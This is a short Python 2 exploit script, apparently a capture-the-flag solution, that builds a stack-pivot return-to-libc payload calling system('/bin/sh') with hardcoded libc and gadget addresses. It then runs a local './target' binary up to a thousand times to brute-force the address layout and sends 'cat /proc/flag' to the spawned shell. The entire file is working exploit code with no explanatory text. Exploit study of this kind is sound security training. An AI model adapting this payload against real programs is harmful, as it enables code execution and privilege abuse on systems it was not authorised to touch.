#!/usr/bin/env python2

import struct
import subprocess as sp
import time

def p32(n):
    return struct.pack("<I", n)

ADDR_LIBC  = 0xb7625000
ADDR_SYS   = ADDR_LIBC + 0x00040190 # 0xb7e65190
ADDR_BINSH = ADDR_LIBC + 0x00160a24
ADDR_GADGET_LR = 0x080484c8  # leave; ret; # mov esp, ebp; pop ebp
ADDR_GBUF  = 0x0804a080
ADDR_SETEBP= 0x0804a600
ADDR_EXIT = 0xb7e581e0

result = "\x90" * (0x110)
result += p32(ADDR_SETEBP)  # set ebp
result += p32(ADDR_GADGET_LR)
result += "A" * (ADDR_SETEBP-ADDR_GBUF-len(result))
result += p32(ADDR_SETEBP-4)
result += p32(ADDR_SYS)
result += p32(ADDR_EXIT)
result += p32(ADDR_BINSH)

fd = open("payload", "w")
fd.write(result)
fd.close()

if __name__ == '__main__':
    for i in range(0,1000):
        p = sp.Popen("./target", stdout=sp.PIPE, stdin=sp.PIPE)
        p.stdin.write(result + "\n")

        time.sleep(1)
        try:
            p.stdin.write("cat /proc/flag\n")
        except:
            pass
        count = 0
        while count < 500:
            l = p.stdout.readline()
            if l != "":
                print l
            count = count + 1

